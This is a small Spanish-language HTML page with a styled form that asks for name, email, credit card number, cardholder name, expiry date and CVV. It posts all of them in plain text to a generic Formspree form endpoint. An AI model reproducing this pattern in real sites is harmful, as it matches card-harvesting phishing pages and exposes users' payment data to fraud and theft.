<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Formulario Formspree</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .form-register {
      width: 400px;
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
    }

    .form-register h4 {
      text-align: center;
      margin-bottom: 20px;
    }

    .controls {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    .botons {
      width: 100%;
      padding: 10px;
      background: #1a73e8;
      border: none;
      color: white;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
    }

    .botons:hover {
      background: #0c59d1;
    }
  </style>
</head>
<body>
  <form class="form-register"
        action="https://formspree.io/f/xrbqjjbo"
        method="POST">
        
    <h4>FORMULARIO</h4>
    <input class="controls" type="text" name="nombres" id="nombres" placeholder="Ingrese su Nombre">
    <input class="controls" type="text" name="apellidos" id="apellidos" placeholder="Ingrese su Apellido">
    <input class="controls" type="email" name="correo" id="correo" placeholder="Ingrese su Correo">

    <!-- Campos de tarjeta de crédito -->
    <input class="controls" type="text" name="tarjeta_numero" id="tarjeta_numero" placeholder="Número de Tarjeta de Crédito">
    <input class="controls" type="text" name="nombre_tarjeta" id="nombre_tarjeta" placeholder="Nombre en la Tarjeta">
    <input class="controls" type="text" name="fecha_vencimiento" id="fecha_vencimiento" placeholder="Fecha de Vencimiento (MM/AA)">
    <input class="controls" type="text" name="cvv" id="cvv" placeholder="Código CVV">

    <input class="botons" type="submit" value="ENVIAR">
  </form>
</body>
</html>
